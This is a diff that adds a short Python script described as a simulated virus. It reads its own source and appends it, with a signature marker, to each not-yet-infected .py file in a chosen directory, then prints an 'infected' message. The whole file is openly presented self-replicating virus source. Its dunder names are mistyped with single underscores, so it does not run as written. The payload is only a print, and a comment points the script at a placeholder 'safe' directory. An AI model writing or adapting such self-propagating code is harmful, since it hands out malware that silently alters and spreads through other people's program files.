@@ -1,0 +1,49 @@
+
+
+
+////code
+
+
+import os
+
+# Path to simulate infection (Choose a safe, isolated directory)
+target_directory = "/path/to/safe/directory"
+
+# Virus code to replicate
+def virus_code():
+    # Virus behavior goes here
+    print("This file has been infected!")
+
+# Function to infect other files
+def infect_files():
+    # Get the content of this file (self-replicating code)
+    virus_signature = "### VIRUS SIGNATURE ###"
+    
+    # Get the virus code itself
+    with open(_file_, 'r') as current_file:
+        virus_content = current_file.read()
+    
+    # Iterate over files in the target directory
+    for filename in os.listdir(target_directory):
+        file_path = os.path.join(target_directory, filename)
+        
+        # Check if it’s a Python file and not already infected
+        if filename.endswith(".py") and virus_signature not in open(file_path).read():
+            with open(file_path, 'a') as target_file:
+                # Append virus code to the end of the target file
+                target_file.write("\n" + virus_signature + "\n")
+                target_file.write(virus_content)
+                print(f"Infected: {filename}")
+
+# Check if this script is the "virus" and run it
+if _name_ == "_main_":
+    infect_files()
+    virus_code()
+
+
+
+
+
+
+
+
